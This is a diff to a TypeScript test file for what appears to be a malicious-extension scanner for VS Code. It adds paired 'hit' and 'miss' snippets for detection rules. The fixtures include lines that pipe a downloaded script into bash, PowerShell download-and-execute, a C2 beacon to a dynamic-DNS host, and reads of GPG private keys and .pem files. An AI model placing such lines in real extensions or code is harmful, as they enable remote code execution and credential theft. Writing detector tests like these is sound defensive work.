@@ -98,6 +98,25 @@ const CASES: Record<string, Case> = {
   'ext/extension-uninstall.command': { hit: `executeCommand('workbench.extensions.uninstallExtension', 'sec.tool');`, miss: `executeCommand('workbench.extensions.action.showInstalledExtensions');` },
   'ext/shell-script-download.pipe': { lang: 'shellscript', hit: `curl -fsSL https://x.example/i | bash`, miss: `curl -fsSL https://x.example/i -o i.txt` },
   'ext/powershell-script.download': { lang: 'powershell', hit: `IEX (New-Object Net.WebClient).DownloadString('https://x.example')`, miss: `Write-Host 'done'` },
+  'ext/network-outbound.module': { hit: `const https = require('https');`, miss: `const h = require('./https-helper');` },
+  'ext/network-outbound.fetch': { hit: `await fetch(url);`, miss: `await this.store.fetch(key);` },
+  'ext/hardcoded-ip-or-raw-url.dyndns': { hit: `connect('https://c2-box.duckdns.org/beacon');`, miss: `log('see duckdns docs');` },
+  'ext/hardcoded-ip-or-raw-url.port': { hit: `fetch('http://updates.badhost.net:4444/x');`, miss: `fetch('https://api.github.com:443/x');` },
+  'ext/telemetry-unauthorized.sdk': {
+    hit: `post('https://api.mixpanel.com/track', data);`,
+    miss: `if (vscode.env.isTelemetryEnabled) post('https://api.mixpanel.com/track', data);`,
+  },
+  'ext/sensitive-dotfiles.path': { hit: `read(join(home, '.gnupg', 'private-keys-v1.d'));`, miss: `read(join(root, '.gnupgrc-example.md'));` },
+  'ext/workspace-secret-harvest.glob': { hit: `vscode.workspace.findFiles('**/*.pem');`, miss: `vscode.workspace.findFiles('**/*.md');` },
+  'ext/terminal-injection.create-send': { hit: `vscode.window.createTerminal('x').sendText(cmd);`, miss: `const t = vscode.window.createTerminal('x'); t.show();` },
+  'ext/command-override.register': { hit: `vscode.commands.registerCommand('git.push', grab);`, miss: `vscode.commands.registerCommand('myext.push', run);` },
+  'ext/debug-session-hook.api': { hit: `vscode.debug.registerDebugAdapterTrackerFactory('*', { createDebugAdapterTracker: t });`, miss: `vscode.debug.registerDebugAdapterTrackerFactory('python', f);` },
+  'ext/webview-remote-content.remote': {
+    hit: `const o = { enableScripts: true }; html = '<script src="https://cdn.example.com/a.js"></script>';`,
+    miss: `const o = { enableScripts: false }; html = '<script src="https://cdn.example.com/a.js"></script>';`,
+  },
+  'ext/high-entropy-string.literal': { hit: `const k = '${b64(400, 11).replace(/\//g, '_')}';`, miss: `const k = '${'abcdefgh'.repeat(40)}';` },
+  'ext/hex-or-unicode-escape-density.literal': { hit: `const s = '${'\\x41'.repeat(45)}';`, miss: `const ws = '\\u00a0\\u1680\\u2000\\u2001 spaces';` },
 };
 
 const run = async (c: Case, text: string) =>
